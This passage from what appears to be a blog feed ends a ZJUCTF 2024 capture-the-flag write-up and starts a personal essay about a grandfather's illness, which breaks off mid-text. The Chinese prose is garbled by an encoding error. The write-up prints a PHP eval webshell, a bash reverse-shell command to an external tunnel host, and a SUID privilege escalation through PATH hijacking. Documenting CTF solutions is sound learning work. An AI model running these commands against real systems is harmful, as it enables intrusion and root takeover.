class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>lis = [<span class="hljs-number">0</span>]*<span class="hljs-number">256</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    tmp = f.readline()<br>    tmp = tmp.replace(<span class="hljs-string">&quot;\\n&quot;</span>,<span class="hljs-string">&quot;\n&quot;</span>)<br>    indexs = <span class="hljs-built_in">int</span>(tmp[tmp.index(<span class="hljs-string">&quot;part&quot;</span>)+<span class="hljs-number">4</span>:tmp.index(<span class="hljs-string">&quot; =&quot;</span>)])<br>    lis[indexs] = tmp[tmp.index(<span class="hljs-string">&#x27;&quot;&#x27;</span>)+<span class="hljs-number">1</span>:-<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>]<br>res = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lis[::-<span class="hljs-number">1</span>]:<br>    res+=i<br>new = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;res.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br>new.write(res)<br><span class="hljs-comment"># print(res)</span><br></code></pre></td></tr></table></figure> res.txtå¼€å¤´é•¿è¿™æ ·ï¼š <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Column() &#123;<br>Row() &#123; &#125;.width(<span class="hljs-string">&#x27;100%&#x27;</span>).height(<span class="hljs-string">&#x27;6%&#x27;</span>)<br>Row() &#123;<br>    Column() &#123; &#125;.width(<span class="hljs-string">&#x27;1%&#x27;</span>).height(<span class="hljs-string">&#x27;100%&#x27;</span>).backgroundColor(<span class="hljs-string">&#x27;#000000&#x27;</span>)<br>    Column() &#123; &#125;.width(<span class="hljs-string">&#x27;1%&#x27;</span>).height(<span class="hljs-string">&#x27;100%&#x27;</span>).backgroundColor(<span class="hljs-string">&#x27;#efefef&#x27;</span>)<br>    Column() &#123; &#125;.width(<span class="hljs-string">&#x27;1%&#x27;</span>).height(<span class="hljs-string">&#x27;100%&#x27;</span>).backgroundColor(<span class="hljs-string">&#x27;#f8f8f8&#x27;</span>)<br></code></pre></td></tr></table></figure></li><li>æ ¹æ®è¿™ä¸ªç»˜åˆ¶çš„é¢œè‰²ç¼–å†™è„šæœ¬ï¼Œæ‰‹åŠ¨ç»˜åˆ¶å¾—åˆ°flagï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;res.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    lines = f.readlines()<br><br>img = []<br><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>    line = line.strip()<br>    <span class="hljs-keyword">if</span> line.startswith(<span class="hljs-string">&quot;Column() &#123; &#125;.width(&#x27;1%&#x27;).hei&quot;</span>):<br>        color = line.index(<span class="hljs-string">&#x27;#&#x27;</span>)<br>        color = line[color+<span class="hljs-number">1</span>:color+<span class="hljs-number">7</span>]<br>        <span class="hljs-keyword">if</span> color == <span class="hljs-string">&#x27;000000&#x27;</span>:<br>            img.append(<span class="hljs-string">&#x27; &#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            img.append(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(img)):<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">100</span> == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(img[i])<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(img[i], end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># ZJUCTF&#123;you_are_good_at_reverse_engineering&#125;</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/42.png"> åªå¼„äº†é»‘ç™½åŒè‰²æ‰€ä»¥å¾ˆä¸‘ï¼ŒåŸå›¾åº”è¯¥æŒºç‚«é…·çš„qaq</li></ul><h2 id="hint">hint</h2><ul><li>é€šè¿‡uploadè·å¾—å…¥å£ç‚¹ï¼Œæ˜¯ä¸€ä¸ªwebshellï¼Œ<code>&lt;?php @eval($_POST['ZJUCTF&#123;Ye5_We1l_inj3C.t10N!!&#125;']);</code>ï¼Œå°è¯•ç”¨èšğŸ—¡è¿æ¥ï¼Œå‘ç°å¹¶ä¸è¡Œ;</li><li>åæ¥æ­å»ºæœ¬åœ°ç¯å¢ƒï¼Œå°è¯•ç”¨postæ–¹æ³•ä¼ å‚ï¼Œå‘ç°å®ƒæŠŠ<code>.</code>è§£ææˆ<code>_</code>äº†ï¼š <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ZJUCTF&#123;Ye5_We1l_inj3C.t10N!!&#125;&#x27;</span>];<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$_POST</span>);<br></code></pre></td></tr></table></figure></li><li>å»ç½‘ä¸Šæœå‘ç°ä¸€ä¸ª<a href="https://blog.csdn.net/mochu7777777/article/details/115050295">åšå®¢</a>ï¼ŒæŠŠå‰é¢ä¸¤ä¸ªä¸‹åˆ’çº¿æ”¹ä¸€ä¸ªä¸­æ‹¬å·å°±å¯ä»¥äº†,æ¥ä¸‹æ¥å°±æ˜¯ä¸€ä¸ªæ­£å¸¸çš„åå¼¹shellï¼Œç”¨<code>system("bash -c 'bash -i &gt;&amp;/dev/tcp/23.tcp.cpolar.top/10161 0&gt;&amp;1'");</code>: <img src="/img/zjuctf2024/51.png"> <img src="/img/zjuctf2024/52.png"></li><li>æˆ‘ä»¬éœ€è¦è¯»å–åˆ°<code>/root</code>æ–‡ä»¶å¤¹ä¸‹çš„flagï¼Œè¯´æ˜æ˜¯ä¸€é“ææƒçš„é¢˜ç›®ï¼ŒæŸ¥çœ‹<code>find / -perm -u=s -type f 2&gt;/dev/null</code>å‘ç°ä¸€ä¸ªæœ‰ç«¯å€ªçš„ç¨‹åº<code>/opt/hint</code>ï¼Œç”¨èšğŸ—¡ä¸‹è½½æ–‡ä»¶ï¼Œåç¼–è¯‘å…¥ä¸‹: <img src="/img/zjuctf2024/54.png"> <img src="/img/zjuctf2024/53.png"></li><li>å‘ç°ç¨‹åºä¸€å¼€å§‹é‡è®¾äº†ç¯å¢ƒå˜é‡ï¼Œå°±ä¸èƒ½é€šè¿‡åŠ¨æ€é“¾æ¥åº“åŠ«æŒç¨‹åºæ¥ææƒäº†ï¼Œä½†æ˜¯å‘ç°ç¨‹åºæ‰§è¡Œäº†<code>system("You are kidding")</code>ï¼Œæ ¹æ®<a href="https://blog.csdn.net/nicai321/article/details/122275160">åšå®¢</a>é€šè¿‡å¦‚ä¸‹æ“ä½œå¯ä»¥ææƒï¼Œæ‹¿åˆ°flag: <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;/bin/bash&quot; &gt; /tmp/You<br>chmod 777 /tmp/You<br>export PATH=/tmp:$PATH<br>cd /opt<br>./hint<br></code></pre></td></tr></table></figure> è¾“å…¥é0å’Œé1çš„æ•°å­—å³å¯(ZJUCTF{Don't_u_liKe_Th3_h1n7???}): <img src="/img/zjuctf2024/55.png"></li></ul><h1 id="æ€»ç»“"><strong>æ€»ç»“</strong></h1><p>ä¸€ä¸ªæ˜ŸæœŸæ‰“ä¸‹æ¥äººéƒ½ç¥å¿—ä¸æ¸…äº†ğŸ« ğŸ« ğŸ«  <img src="/img/zjuctf2024/result.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF writeup</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å¦‚æœç”Ÿå‘½æ²¡æœ‰ç»ˆç‚¹</title>
    <link href="/2023/03/18/%E5%A6%82%E6%9E%9C%E7%94%9F%E5%91%BD%E6%B2%A1%E6%9C%89%E7%BB%88%E7%82%B9/"/>
    <url>/2023/03/18/%E5%A6%82%E6%9E%9C%E7%94%9F%E5%91%BD%E6%B2%A1%E6%9C%89%E7%BB%88%E7%82%B9/</url>
    
    <content type="html"><![CDATA[    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-138c0475" role="button" aria-expanded="false" aria-controls="collapse-138c0475">        <div class="fold-arrow">â–¶</div>å‰è¨€      </div>      <div class="fold-collapse collapse" id="collapse-138c0475">        <div class="fold-content">          <p>è¡¥ä¸€ä¸‹æˆ‘çš„æˆåä¹‹ä½œï¼ˆbushiï¼‰ï¼Œå‘åœ¨<a href="https://www.jianshu.com/p/5e4885b0d93b">ç®€ä¹¦-å¦‚æœç”Ÿå‘½æ²¡æœ‰ç»ˆç‚¹</a>ã€‚</p>        </div>      </div>    </div><h1 id="æ­£æ–‡">æ­£æ–‡</h1><p>åœ¨çˆ·çˆ·è¢«è¯Šæ–­å‡ºè‚ç™Œçš„é‚£å¹´ï¼Œæˆ‘æ‰åäºŒå²ã€‚</p><p>åƒè¿™ä¸ªå¹´é¾„æ®µçš„å°å­©ï¼Œå…³äºé•¿è¾ˆçš„ç—…æƒ…æ˜¯ä¸‡ä¸‡å¬ä¸å¾—çš„ï¼Œå°å­©å­è‹¥æ˜¯å¬äº†ï¼Œå°±æ€•ä»–ä¸€çŸ¥åŠè§£ï¼Œåˆ°å¤„ä¹±åš·åš·ã€‚äºæ˜¯ï¼Œæ¯å½“å¤§å¤«æŠ½ç©ºåˆ°æˆ‘å®¶å–æ¯èŒ¶çš„æ—¶å€™ï¼Œæˆ‘å°±ä¼šè¢«æ”¯ä½¿ç€å»å§‘å§‘å®¶æ‹¿ç“¶é…±æ²¹æ¥ï¼Œæˆ–æ˜¯ä¸€å—æ‰‹å¸•ï¼Œä¸€æ ¹å”‡è†ï¼Œå„ç§çç¢çš„ç”Ÿæ´»ç”¨å“ã€‚æˆ‘å¶å°”æ‡’äº†ã€ä¹äº†ï¼Œæ’’ç€å¨‡ä¸è‚¯å‡ºå»æ—¶ï¼Œå¥¹ä»¬å°±æŠŠæˆ‘å®‰æ’åˆ°çˆ·çˆ·çš„æˆ¿é—´é‡Œâ€”â€”è¿™ç­‰ç§˜å¯†ï¼Œçˆ·çˆ·ä¹Ÿæ˜¯ä¸è®©å¬çš„ã€‚ä¸€æƒ³åˆ°çˆ·çˆ·éƒ½è¢«å¦‚æ­¤å¯¹å¾…ï¼Œæˆ‘é‚£å› å¥½å¥‡è€Œè ¢è ¢æ¬²åŠ¨çš„å¿ƒä¹Ÿå°±å®‰åˆ†äº†ä¸‹æ¥ã€‚</p><p>çˆ·çˆ·å°±ååœ¨å’¯å±å’¯å±å“çš„æ‘‡æ¤…ä¸Šï¼Œä¸¤çœ¼æœ›ç€çª—å¤–ï¼Œç”šè‡³ä¸ä¼šå› æˆ‘çš„åˆ°æ¥è€Œæ”¹å˜è§†çº¿ã€‚æˆ‘å‘¢ï¼Œæ¬å¼ å‡³å­ååœ¨èŒ¶å‡ å‰ï¼Œæ‘†å¼„ç€æ¡Œä¸Šä»…æœ‰çš„å‡ æ ·å°ç©æ„ï¼Œå‘æŒ¥èµ·è‡ªå·±çš„æƒ³è±¡åŠ›æ¥ã€‚é‚£ã€Šå”è¯—é‰´èµè¯å…¸ã€‹æ˜¯æ¶èˆªæ¯ï¼Œé¢å·¾çº¸æ˜¯é£æœºï¼Œæ£‰ç­¾æ˜¯å£«å…µï¼Œå‡ ç²’æŠ—ç—…æ¯’èƒ¶å›Šæ˜¯ç‚®å¼¹ï¼Œè€Œæ•Œäººå°±æ˜¯ååœ¨æ‘‡æ¤…ä¸Šé‚£ä½ã€‚æˆ‘ä¸€æ‰‹æ‰˜ç€é¢å·¾çº¸ï¼Œä¸Šä¸‹å˜´å”‡éœ‡åŠ¨å‘å‡ºé£æœºçš„è½°é¸£å£°ï¼Œå¦ä¸€åªæ‰‹æ”¥ç€å‡ ç²’èƒ¶å›Šå°±å¾€æ•Œäººèº«ä¸Šæ‰”ã€‚â€œè¿›æ”»ï¼â€æˆ‘å¤§å–Šã€‚æ•Œäººå¾ˆæ˜æ˜¾æºƒä¸æˆå†›ï¼Œä»–å°å¿ƒç¿¼ç¿¼åœ°æŠŠè·Œè½åœ¨åœ°çš„â€œç‚®å¼¹â€æ‹¾èµ·æ¥ï¼Œæ‹¿çœ¼æŠŠæˆ‘ä¸€çªï¼Œå°±æ²¡äº†ä¸‹æ–‡ã€‚</p><p>ç‚®å¼¹æ‰”å…‰äº†ï¼Œæˆ‘å°±è€è€å®å®åœ°è¶´åœ¨åºŠè¾¹ï¼Œæ•°ç€æ ‘ä¸Šçš„éº»é›€ã€‚é™¢å­é‡Œæœ‰ä¸‰æ£µæ ‘ï¼Œä¸¤æ£µæ˜¯æˆ‘ä»¬æ¬æ¥å‰å°±æœ‰çš„ï¼Œè¿˜æœ‰ä¸€æ£µé•¿å¯¿æ ‘è‹—ï¼Œå°±ç§åœ¨èŠ±å›æ­£ä¸­å¤®ï¼ŒåˆšæŠ½å‡ºå‡ é¢—æ–°èŠ½ã€‚</p><p>ä¸€ä¸ªäººå‘†ä¹…äº†ï¼Œè‡ªç„¶å°±ä¼šè¯´äº›å‚»è¯ï¼Œè‡³å°‘æˆ‘æ˜¯è¿™ä¹ˆè®¤ä¸ºçš„ã€‚çˆ·çˆ·å°±æ˜¯è¿™æ ·ï¼Œç»å¸¸è¹¦å‡ºå‡ å¥ä»€ä¹ˆâ€œå²æœˆä¸é¥¶äººâ€ï¼Œæˆ‘ä¸æ‡‚ï¼Œé—®ä»–ä»–ä¹Ÿä¸å›ç­”ã€‚è‹¥æ˜¯å›ç­”äº†ï¼Œä¹Ÿæ˜¯å½é‡Œå’•å™œä¸€å¤§å †è¯ï¼Œè¿˜æ˜¯å¬ä¸æ‡‚ã€‚æœ«äº†ï¼Œæˆ‘å¹²è„†å°±ä¸é—®ã€‚è¿™ä¸‹çˆ·çˆ·ä¸æ»¡æ„äº†ï¼Œè§æˆ‘ä¸è¯´è¯ï¼Œä»–å°±åè¿‡æ¥é—®æˆ‘é—®é¢˜ã€‚</p><p>â€œæ¯›æ¯›ï¼Œåœ¨çœ‹ä»€ä¹ˆå‘¢ï¼Ÿâ€</p><p>å¯¹äºä¸€ä¸ªå­©å­æ¥è¯´ï¼Œä¸–ç•Œä¸Šæœ€å€¼å¾—å…´å¥‹ä¹‹äº‹è«è¿‡äºæ‹¥æœ‰ä¸€ä½æ„¿æ„å¬ä½ ç¨€å¥‡å¤æ€ªæƒ³è±¡çš„å¬ä¼—äº†ã€‚æˆ‘å°±ä¼šè·Ÿçˆ·çˆ·è®²ï¼Œé™¢å­é‡Œè¿™æ£µæ¨Ÿæ ‘æ˜¯çˆ¸çˆ¸ï¼Œé‚£æ£µæŸ³æ ‘æ˜¯å¦ˆå¦ˆï¼Œæˆ‘æ˜¯é‚£æ£µå°æ ‘è‹—ï¼Œä»–ä»¬ä¸ºæˆ‘é®é£æŒ¡é›¨ï¼Œå‘µæŠ¤æˆ‘é•¿å¤§â€¦â€¦</p><p>â€œé‚£ä½ çˆ·çˆ·æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿâ€</p><p>â€œçˆ·çˆ·å˜›â€¦â€¦â€æˆ‘æŠŠçœ¼ç›è½¬äº†è½¬ï¼Œå—¤å—¤åœ°ç¬‘ç€ï¼Œâ€œçˆ·çˆ·æ˜¯é‚£æŒ‚åœ¨å¢™å¤´é»‘ä¸æºœç§‹çš„è€é“é”¹ï¼â€</p><p>â€œä½ è¿™è‡­å°å­ï¼â€ä»–ä½œåŠ¿æŠŠçœ¼ç›ä¸€çªï¼Œè£…ç€è¦æ‰“æˆ‘çš„æ ·å­ï¼Œâ€œæ™šä¸Šä¸ç»™ä½ ç‚–ä¸¸å­åƒäº†ï¼â€</p><p>â€œåˆ«å•Šï¼Œçˆ·çˆ·ï¼æˆ‘çŸ¥é“çˆ·çˆ·æœ€å¥½äº†ï¼â€</p><p>æˆ‘ä»¬åœ¨æˆ¿é—´é‡Œé—¹ç€ï¼Œå¤§äººä»¬åœ¨å®¢å…é‡ŒèŠç€ã€‚é‡Œé¢æ˜¯çƒ­ç«æœå¤©ï¼Œå¤–é¢æ˜¯ä¸¥è‚ƒæ²‰é—·ã€‚ç­‰æˆ‘é—¹ç´¯äº†ï¼Œå®‰é™åœ°è¶´åœ¨çˆ·çˆ·æ€€é‡Œçš„æ—¶å€™ï¼Œå¤§äººä»¬çš„ç§˜å¯†å°±ä¼šä»çª—æ²¿è¾¹ã€é—¨ç¼ä¸­é£˜è¿›æ¥ï¼Œé©±èµ¶èµ°ä»åœ¨ç©ºä¸­å……æ–¥ç€çš„æ¬¢ä¹æ°”æ°›ã€‚æˆ‘æ¯•ç«Ÿåªæ˜¯ä¸ªå­©å­ï¼Œè‡ªç„¶å¬ä¸æ‡‚ä»€ä¹ˆå«â€œç—…å˜ç™Œç»†èƒâ€â€œè‚ç§»æ¤â€ï¼Œä½†æˆ‘å› èƒ½çŸ¥é“è¿™äº›ç§˜å¯†è€Œè‡ªè±ªâ€”â€”çŸ¥é“è¿™äº›ç§˜å¯†å°±æ˜¯ä¸ªå¤§äººäº†ï¼Œä¸æ˜¯å—ï¼Ÿäºæ˜¯æˆ‘è´¹åŠ›åœ°å¬ç€ï¼Œæ¨¡ä»¿çˆ·çˆ·è¹™èµ·çœ‰å¤´ï¼Œä¸€è¾¹åˆç‚¹ç‚¹å¤´è£…ä½œè‡ªå·±å¬æ‡‚äº†ã€‚å¯æ²¡è¿‡å¤šä¹…æˆ‘åˆè¢«çª—å¤–çš„èœ»èœ“å‹¾èµ°äº†é­‚ã€‚</p><p>é‚£æ—¶æˆ‘è¿˜ä¸çŸ¥é“çˆ·çˆ·çš„è‚ç™Œå·²ç»æ­¥å…¥äº†æ™šæœŸï¼Œå¹³æ—¶åƒçš„èƒ¶å›Šå·²ç»éš¾å ªå¤§ç”¨ï¼Œè€Œè‚ç§»æ¤çš„è´¹ç”¨å¯¹äºæˆ‘å®¶æ¥è¯´æ˜¯ä¸€ä¸ªå¤©ä»·ã€‚æˆ‘åªçŸ¥é“çˆ·çˆ·å†ä¹Ÿæ²¡æ³•èµ·åºŠç»™æˆ‘ç‚–ä¸¸å­åƒäº†ã€‚ä»–æ•´æ—¥æ•´å¤œåœ°èººåœ¨åºŠä¸Šï¼Œå¦ˆå¦ˆç«¯ç»™ä»–çš„ç¨€é¥­ä»–æ²¡åƒå‡ å£å°±ä¼šæ”¾ä¸‹ã€‚æˆ‘ç»å¸¸çœ‹åˆ°ä»–æ‚ç€è‚šå­çš„å³ä¸Šä¾§ï¼Œåœ¨åºŠä¸Šç¿»æ¥è¦†å»ï¼Œé¢è‰²æ‰­æ›²ã€‚ç­‰ä»–å‘è§‰æˆ‘åœ¨çœ‹ä»–æ—¶ï¼Œä»–å°±ä¼šå°´å°¬åœ°ç¬‘ç¬‘ï¼Œè£…ä½œä»€ä¹ˆä¹Ÿæ²¡å‘ç”Ÿï¼Œå¯é‚£çƒæˆä¸€å›¢çš„è¢«å•ä¸ä»–é¢å¤´ä¸Šçš„æ±—ç è¯æ˜æˆ‘æ²¡æœ‰çœ‹é”™ã€‚è¿™äº›ç‰‡æ®µå¼çš„æƒ…æ™¯åœ¨æˆ‘çš„è„‘æµ·é‡Œåå¤é‡ç»„ã€æ‹¼æ¥æˆä¸€ä¸ªæ¨¡ç³Šçš„æ¦‚å¿µï¼šçˆ·çˆ·æ‚£äº†è‚ç™Œï¼Œè¿™æ˜¯ç§å¾ˆç—›çš„ç—…ã€‚</p><p>è‡ªä»çˆ·çˆ·çš„ç—…æƒ…æ¶åŒ–ä»¥åï¼Œå¤§å¤«å°±ä¸æ€ä¹ˆæ¥äº†ã€‚ä»–å»ºè®®æˆ‘ä»¬é€è€äººå®¶ä½é™¢ï¼Œä½†çœ‹åˆ°æˆ‘çˆ¸å¦ˆè„¸ä¸Šä¸ºéš¾çš„ç¥æƒ…ï¼Œå°±æ²¡æœ‰å¤šè¯´ä»€ä¹ˆã€‚æˆ‘å€’æ˜¯ç»å¸¸å¾€çˆ·çˆ·çš„æˆ¿é—´è·‘ï¼Œæƒ³ç€æ³•å­é€—ä»–å¼€å¿ƒâ€”â€”åˆ°åæ¥ä»–çœ‹åˆ°æˆ‘èµ°è¿›æˆ¿é—´éƒ½ä¼šä¸è‡ªä¸»åœ°ç¬‘ä¸¤å£°ã€‚</p><p>çˆ·çˆ·æœ€ç»ˆè¿˜æ˜¯å®äº†ã€‚å‡ ä¸ªç™½å¤§è¤‚æŠŠä»–ä»æˆ¿é—´é‡ŒæŠ¬å‡ºæ¥ï¼Œä»–æ‰‹é‡Œç‰¢ç‰¢æ”¥ç€è¢«å•ï¼Œè¢«å•åœ¨åœ°ä¸Šè¹­äº†ä¸€èº«ç°ã€‚æˆ‘èº²åœ¨çˆ¶æ¯èº«åä¸€è„¸ç•æƒ§åœ°çœ‹ç€ï¼Œé‚£èœ·ç¼©ç€çš„èº«å½±åœ¨æ‹…æ¶ä¸Šä¸€ä¸Šä¸€ä¸‹åœ°é¢ ç°¸ï¼Œå°±åƒæµ·ä¸Šçš„ä¸€ç‰‡å¶å­ï¼ŒæµªèŠ±ä¸€å·ï¼Œå°±è¢«æ— å°½çš„é»‘æš—åæ²¡ã€‚</p><p>ä¸€ä¸ªç™½å¤§è¤‚æœæˆ‘ä»¬èµ°æ¥ï¼Œæˆ‘ä¸‹æ„è¯†åœ°å¾€åé€€äº†é€€ã€‚â€œè¿˜æœ‰å‘¼å¸ï¼Œåªæ˜¯â€¦â€¦â€é‚£ä¸ªäººæ²¡æœ‰å†è¯´ä¸‹å»ï¼Œä½†æŠŠä¸¤æ ¹é£ŸæŒ‡æ­åœ¨ä¸€èµ·ï¼Œæ¯”äº†ä¸ªâ€œåâ€çš„æ‰‹åŠ¿ã€‚çˆ¸å¦ˆå¿ƒç…§ä¸å®£åœ°ç‚¹ç‚¹å¤´ï¼Œè€Œæˆ‘ä¹Ÿåœ¨é‚£ä¸ªæ‰‹åŠ¿ä¸­å—…å‡ºäº†å±é™©çš„æ°”å‘³ã€‚</p><p>ä½é™¢è´¹æ˜¯å§‘å§‘ä»˜çš„ã€‚è¿™å‡ å¹´æ¥çˆ·çˆ·ä¸€ç›´ä½åœ¨æˆ‘å®¶ï¼Œå§‘å§‘ä¸€ä¸ªäººåœ¨å¤–è¾¹æ½‡æ´’ï¼Œæ²¡æœ‰å°½åˆ°èµ¡å…»çš„ä¹‰åŠ¡ã€‚è‹¥æ˜¯åˆ°äº†è¿™ä¸ªæ—¶å€™è¿˜ä¸å‡ºæŠŠåŠ›ï¼Œææ€•æ˜¯è¦è¢«åˆ«äººè¯´é—²è¯çš„ã€‚å§‘å§‘ä¸æ€•çˆ·çˆ·çš„å†·çœ¼ä¸æŒ‡è´£ï¼Œä¸æ€•å¤©ï¼Œä¸æ€•åœ°ï¼Œå°±æ€•é‚»å±…æœ‹å‹å¯¹å¥¹æŒ‡æŒ‡ç‚¹ç‚¹ã€‚äºæ˜¯ä¹ï¼Œå¥¹ç”šè‡³æ‰“åŒ…è¡Œæè·‘æ¥æˆ‘ä»¬å®¶ä½ï¼Œå°±ä¸ºäº†ç¦»åŒ»é™¢è¿‘äº›ã€‚</p><p>çˆ·çˆ·ä¸åœ¨å®¶çš„é‚£æ®µæ—¶é—´ï¼Œæˆ‘å°±ååœ¨é‚£æŠŠæ‘‡æ¤…ä¸Šï¼Œä»€ä¹ˆæ—¶å€™é™¢å­é‡Œé‚£æŠŠé“é”¹è¢«é£å¹å€’äº†ï¼Œæˆ‘ä¼šè·‘è¿‡å»æŠŠå®ƒæ‰¶èµ·æ¥ã€‚çˆ¸å¦ˆæ›¾å±¡æ¬¡è·Ÿæˆ‘æš—ç¤ºï¼Œåå¤©åçˆ·çˆ·å°±ä¼šå»ä¸€ä¸ªåœ°æ–¹åº¦å‡ï¼Œå¯è¿™åªæ˜¯å¤§äººä»¬çš„è¯´è¾ã€‚æˆ‘çŸ¥é“ï¼Œçˆ·çˆ·è¦é¢å¯¹çš„ä¸œè¥¿å«æ­»äº¡ï¼šå¤±å»å¯¹è‚‰ä½“çš„æ§åˆ¶ï¼Œå¤±å»æ€æƒ³ï¼Œå¤±å»çµé­‚ï¼ŒæŠ›ä¸‹ä¸€åˆ‡ï¼Œå •å…¥é»‘æš—ã€‚è™½ç„¶æˆ‘å¾ˆéš¾æƒ³è±¡è¿™ä¸€åˆ‡ä»£è¡¨ç€ä»€ä¹ˆï¼Œä½†çˆ·çˆ·ä¸å¯èƒ½éª—æˆ‘â€”â€”ä»–ç»å¸¸å‘æˆ‘å¦ç„¶åœ°è§£é‡Šæ­»äº¡ã€‚ä»–è¯´ï¼Œä»–ä¼šè¢«ç›–ä¸Šé»‘å¸ƒï¼Œè£…è¿›ç®±å­ï¼Œåœ¨è¡—ä¸Šâ€œè¡Œèµ°â€ä¸€ç•ªï¼Œå†é€åˆ°ç«è‘¬åœºï¼ŒåŒ–ä¸ºå°˜åœŸã€‚æ¯æ¬¡ä»–è®²èµ·è¿™äº›çš„æ—¶å€™ï¼Œæˆ‘çš„çœ¼å‰å°±ä¼šæµ®ç°å‡ºä¸€åœºå¤§ç«ï¼Œä¸€ä¸ªäººé™é™åœ°èººåœ¨é‡Œé¢ï¼Œçš®è‚¤ä¸€ç‚¹ç‚¹ç„¦é»‘ã€å†…é™·ï¼Œé€æ¸å˜æˆä¸€å›¢ç°çƒ¬ã€‚æˆ‘è«ååœ°å¿ƒå£å‘å µï¼Œçœ¼æ³ªä¼šä¸äº‰æ°”åœ°æ»šä¸‹å»ã€‚</p><p>â€œå‚»å­©å­ï¼Œå“­ä»€ä¹ˆï¼Œä¸€åˆ‡éƒ½ä¼šè¿‡å»çš„ã€‚â€çˆ·çˆ·æ€»æ˜¯è¿™ä¹ˆè¯´ã€‚</p><p>å¦‚ä»Šæˆ¿é—´ç©ºè¡è¡çš„ï¼Œåªæœ‰å‡ é¢—èƒ¶å›Šé™é™åœ°èººåœ¨æ¡Œä¸Šã€‚æˆ‘æŠŠå®ƒå¾€æ‘‡æ¤…æ‰”å»ï¼Œçœ¼æ³ªä¸è¦é’±ä¼¼çš„æµå‡ºæ¥ã€‚èƒ¶å›Šåœ¨æ‰¶æ‰‹ä¸Šå¼¹å¼€ï¼Œæ»šè½åˆ°åœ°æ¿ä¸Šã€‚æ²¡æœ‰äººæ¡èµ·æ¥ã€‚</p><p>ä¹å¤©äº†ã€‚æ¯å¤©æ—©ä¸Šæˆ‘éƒ½ä¼šè¢«æ¢¦ä¸­çš„é‚£åœºå¤§ç«å“é†’ã€‚æˆ‘å¼€å§‹é¿å¼€å®¶ä¸­ä¸€åˆ‡ç±»ä¼¼ç°çƒ¬çš„ç²‰çŠ¶ç‰©ï¼Œå°±è¿å¨æˆä¸€å›¢çš„ç°æ¯›çº¿éƒ½ä¼šè®©æˆ‘å¿ƒæœ‰ä½™æ‚¸ã€‚â€œçˆ·çˆ·ï¼Œæˆ‘æ€•ã€‚â€æˆ‘å–ƒå–ƒç€ï¼Œå£°éŸ³åœ¨æˆ¿é—´é‡Œå›å“ã€‚</p><p>æˆ‘å·²ç»ä¸è®°å¾—æˆ‘æ˜¯æ€æ ·å¤®æ±‚çˆ¶æ¯å¸¦æˆ‘å»åŒ»é™¢çš„äº†ã€‚å› ä¸ºçœ‹åˆ°é‚£å…·è‹è€çš„èº«èº¯çš„æ—¶å€™ï¼Œæˆ‘å°±åªå‰©ä¸‹äº†å…³äºä»–çš„è®°å¿†ã€‚ä»–å¹³èººåœ¨ç—…åºŠä¸Šï¼Œæ‰‹ä¸Šèƒ¸ä¸Šè‚šå­ä¸Šè´´æ»¡äº†å„å¼å„æ ·çš„é‡‘å±ç‰‡ã€æ’æ»¡äº†å¤§å¤§å°å°çš„ç®¡å­ã€‚ä»–çš„è„¸é¢Šé™·è¿›éª¨å¤´é‡Œï¼Œå°±åƒè¢«ç«çƒ§è¿‡ä¸€æ 